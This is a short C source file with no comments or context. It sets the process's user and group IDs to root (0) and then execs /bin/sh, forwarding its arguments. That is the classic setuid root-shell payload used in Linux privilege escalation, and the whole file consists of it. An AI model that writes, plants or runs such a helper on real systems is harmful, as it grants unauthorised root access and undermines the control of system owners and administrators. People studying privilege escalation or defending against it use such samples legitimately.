#include <unistd.h>
int main(int argc, char **argv) {
    setuid(0); setgid(0);
    seteuid(0); setegid(0);
    argv[0] = "/bin/sh";
    execve("/bin/sh", argv, NULL);
    return 1;
}
